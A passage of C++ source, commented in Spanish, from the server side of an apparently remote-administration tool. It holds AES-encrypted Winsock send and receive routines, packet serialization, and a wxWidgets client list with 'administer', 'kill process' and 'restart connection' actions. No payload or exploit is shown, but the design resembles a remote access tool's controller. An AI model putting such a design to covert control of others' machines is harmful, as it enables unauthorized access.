    //Restaurar
    if (isBlock) {
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DEBUG_MSG("[cSend]Error configurando el socket NON_BLOCK");
        }
    }
    
    return iEnviado;
}

int Servidor::recv_all(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags) {
    int iRecibido = 0;
    int iTotalRecibido = 0;
    while (iTotalRecibido < pLen) {
        iRecibido = recv(pSocket, pBuffer + iTotalRecibido, pLen - iTotalRecibido, pFlags);
        if (iRecibido == 0) {
            //Se cerro el socket
            break;
        }else if (iRecibido == SOCKET_ERROR) {
            //Ocurrio un error
            return iRecibido;
        }

        iTotalRecibido += iRecibido;
    }

    return iTotalRecibido;
}

int Servidor::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool isBlock, DWORD* error_code) {
    
    // 1 non block
    // 0 block
    
    int          iRecibido = SOCKET_ERROR;
    int               temp_error_code = 0;
    unsigned long int          iBlock = 0;
    std::vector<char>         cRecvBuffer;
    bool               bErrorFlag = false;
    if (isBlock) {
        //Hacer el socket block
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DEBUG_MSG("[cRecv]Error configurando el socket NON_BLOCK");
        }
    }

    //Leer primero sizeof(int) para obtener el total de bytes a leer
    char cBuffSize[sizeof(int)];
    int iPaqueteSize = recv(pSocket, cBuffSize, sizeof(int), pFlags);
    if (error_code != nullptr) {
        *error_code = WSAGetLastError();
    }
    if (iPaqueteSize == sizeof(int)) {
        memcpy(&iPaqueteSize, cBuffSize, sizeof(int));
        //Establecer un limite para evitar buffer demasiado grande 
        if (iPaqueteSize > 0 && iPaqueteSize < MAX_PAQUETE_SIZE) {
            cRecvBuffer.resize(iPaqueteSize);
            iRecibido = this->recv_all(pSocket, cRecvBuffer.data(), iPaqueteSize, pFlags);
            if (error_code != nullptr) {
                *error_code = WSAGetLastError();
            }
            if (iRecibido == SOCKET_ERROR) {
                DEBUG_MSG("No se pudo leer nada recv_all.");
                bErrorFlag = true;
            }
        }else {
            DEBUG_MSG("Error parseando entero");
            DEBUG_MSG(iPaqueteSize);
            bErrorFlag = true;
        }
    }else if (iPaqueteSize == SOCKET_ERROR) {
        bErrorFlag = true;
    }
    
    //Restaurar el socket
    if (isBlock) {
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DEBUG_MSG("[1][cRecv]Error configurando el socket NON_BLOCK:");
            DEBUG_MSG(iRecibido);
        }
    }

    if (bErrorFlag || iRecibido == WSAECONNRESET || iRecibido == SOCKET_ERROR) {
        return iRecibido;
    }

    //Decrypt
    ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cRecvBuffer.data()), iRecibido);
    iRecibido = bOut.size();
    if (iRecibido == 0) {
        ERROR("Error desencriptando los datos a enviar");
        return 0;
    }

    pBuffer.resize(iRecibido);
    if (pBuffer.size() == iRecibido) {
        memcpy(pBuffer.data(), bOut.data(), iRecibido);
    }else {
        DEBUG_MSG("[cRecv] No se pudo reservar memoria en el buffer de salida");
        return 0;
    }
    return iRecibido;
}

void Servidor::m_SerializarPaquete(const Paquete& paquete, char* cBuffer) {
    memcpy(cBuffer, &paquete.uiTipoPaquete, sizeof(paquete.uiTipoPaquete));
    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete), &paquete.uiTamBuffer, sizeof(paquete.uiTamBuffer));
    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer), &paquete.uiIsUltimo, sizeof(paquete.uiIsUltimo));
    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.cBuffer.data(), paquete.uiTamBuffer);
}

bool Servidor::m_DeserializarPaquete(const char* cBuffer, Paquete& paquete, int bufer_size) {
    if (bufer_size < PAQUETE_MINIMUM_SIZE) { return false; }
    memcpy(&paquete.uiTipoPaquete, cBuffer, sizeof(paquete.uiTipoPaquete));
    memcpy(&paquete.uiTamBuffer, cBuffer + sizeof(paquete.uiTipoPaquete), sizeof(paquete.uiTamBuffer));
    memcpy(&paquete.uiIsUltimo, cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer), sizeof(paquete.uiIsUltimo));
    
    if (paquete.uiTamBuffer > 0 && paquete.uiTamBuffer < MAX_PAQUETE_SIZE) {
        paquete.cBuffer.resize(paquete.uiTamBuffer);
    }else {
        return false;
    }

    if (paquete.cBuffer.size() == paquete.uiTamBuffer) {
        memcpy(paquete.cBuffer.data(), cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.uiTamBuffer);
    }else {
        ERROR("[Deserializar] No se pudo reservar memoria para el buffer");
        return false;
    }
    return true;
}

void Servidor::m_BorrarCliente(std::mutex& mtx, int iIndex, bool isEnd) {
    std::unique_lock<std::mutex> lock(mtx);
    if (iIndex < static_cast<int>(this->vc_Clientes.size()) && iIndex >= 0) {
        if (this->vc_Clientes[iIndex]) {
            this->vc_Clientes[iIndex]->JoinThread();
            m_CerrarConexion(this->vc_Clientes[iIndex]->p_Cliente._sckCliente);
            this->vc_Clientes[iIndex]->m_setFrameVisible(false);
            delete this->vc_Clientes[iIndex];
            this->vc_Clientes[iIndex] = nullptr;

            if (!isEnd) { this->vc_Clientes.erase(vc_Clientes.begin() + iIndex); }
        }
    }
}

//AES256
ByteArray Servidor::bEnc(const unsigned char* pInput, size_t pLen) {
    ByteArray bOutput;
    ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
    if (enc_len <= 0) {
        DEBUG_MSG("Error encriptando:");
        DEBUG_MSG(pInput);
    }
    return bOutput;
}

ByteArray Servidor::bDec(const unsigned char* pInput, size_t pLen) {
    ByteArray bOutput;
    ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
    if (dec_len <= 0) {
        DEBUG_MSG("Error desencriptando:");
        DEBUG_MSG(pInput);
    }
    return bOutput;
}

//Mostrar menu contextual frame princiopal
void MyListCtrl::ShowContextMenu(const wxPoint& pos, long item) {

    wxMenu menu;
    menu.Append(EnumIDS::ID_Interactuar, "Administrar");

    wxMenu* subMenu1 = new wxMenu;
    subMenu1->Append(EnumIDS::ID_CerrarProceso, "Matar proceso");
    subMenu1->Append(EnumIDS::ID_ReiniciarCliente, "Reiniciar conexion");

    menu.AppendSubMenu(subMenu1, "Cliente");
    menu.AppendSeparator();
    menu.Append(EnumIDS::ID_Refrescar, "Refrescar");
    
    PopupMenu(&menu, pos.x, pos.y);
}

void MyListCtrl::OnContextMenu(wxContextMenuEvent& event){
    if (GetEditControl() == NULL)
    {
        wxPoint point = event.GetPosition();

        // If from keyboard
        if ((point.x == -1) && (point.y == -1))
        {
            wxSize size = GetSize();
            point.x = size.x / 2;
            point.y = size.y / 2;
        }
        else
        {
            point = ScreenToClient(point);
        }

        int flags;
        long iItem = HitTest(point, flags);

        if (iItem == -1) {
            return;
        }

        wxString st1 = this->GetItemText(iItem, 0);
        this->strTmp = st1;
        this->strTmp.append(1, '/');
        this->strTmp += this->GetItemText(iItem, 1);
        this->strTmp.append(1, '/');
        this->strTmp += this->GetItemText(iItem, 2);

        ShowContextMenu(point, iItem);
    }
    else
    {
        event.Skip();
    }
}

void MyListCtrl::OnInteractuar(wxCommandEvent& event) {
    std::vector<std::string> vcOut = strSplit(this->strTmp.ToStdString(), '/', 1);
    int iCliIndex = p_Servidor->IndexOf(vcOut[0]);
    
    if (iCliIndex != -1) {
        p_Servidor->vc_Clientes[iCliIndex]->CrearFrame(this->strTmp.ToStdString(), vcOut[0]);
    }
}

void MyListCtrl::OnActivated(wxListEvent& event) {
    if (this->GetItemCount() > 0) {
        wxString strID = this->GetItemText(event.GetIndex(), 0);
        std::unique_lock<std::mutex> lock(vector_mutex);
        for (auto& cliente : p_Servidor->vc_Clientes) {
            if (cliente->p_Cliente._id == strID.ToStdString()) {
                lock.unlock();
                
                wxString st1 = this->GetItemText(event.GetIndex(), 0);
                st1.append(1, '/');
                st1 += this->GetItemText(event.GetIndex(), 1);
                st1.append(1, '/');
                st1 += this->GetItemText(event.GetIndex(), 2);
                cliente->CrearFrame(st1.ToStdString(), strID.ToStdString());
                break;
            }
        }
    }
}

void MyListCtrl::OnRefrescar(wxCommandEvent& event) {
    this->DeleteAllItems();
    std::unique_lock<std::mutex> lock(vector_mutex);

    for (auto& cliente : p_Servidor->vc_Clientes) {
        p_Servidor->m_InsertarCliente(cliente->p_Cliente);
    }
}

void MyListCtrl::OnMatarProceso(wxCommandEvent& event) {
    std::vector<std::string> vcOut = strSplit(this->strTmp.ToStdString(), '/', 1);
    int iCliIndex = p_Servidor->IndexOf(vcOut[0]);
    if (iCliIndex != -1) {
        p_Servidor->cChunkSend(p_Servidor->vc_Clientes[iCliIndex]->p_Cliente._sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_STOP);
        p_Servidor->m_CerrarConexion(p_Servidor->vc_Clientes[iCliIndex]->p_Cliente._sckCliente);
    }
}
